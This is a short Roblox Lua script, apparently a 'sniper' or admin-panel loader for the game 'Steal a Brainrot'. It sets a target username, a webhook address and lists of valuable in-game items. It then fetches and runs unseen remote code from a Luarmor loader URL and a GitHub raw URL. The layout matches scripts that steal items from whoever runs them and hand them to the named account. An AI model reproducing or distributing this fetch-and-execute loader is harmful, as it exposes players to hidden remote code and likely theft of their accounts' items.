-- Mode: ADMINPANEL
getgenv().TARGET_USERNAME = "Emkivan"
getgenv().WEBHOOK_URL = "discord.gg/oblivionhub oblivionhub.xyz"
getgenv().NORMAL_BRAINROTS = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Garama and Madundung"] = true,
    ["Cerberus"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Aquanini"] = true
}
getgenv().NORMAL_BASE_SKINS = {
    ["Rose"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Christmas"] = true,
    ["Bunny Basket"] = true,
    ["Summer"] = true,
    ["Pot of Gold"] = true,
    ["Taco"] = true,
    ["Octo"] = true,
    ["Valentines"] = true,
    ["Easter"] = true,
    ["Lucky"] = true,
    ["Aquatic"] = true,
    ["Tralalero"] = true,
    ["Bee Emperor"] = true,
    ["Honey Bee"] = true
}
getgenv().NORMAL_GEARS = {}

-- Cargando GUI SNIPER
task.spawn(function()
   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua"))()
end)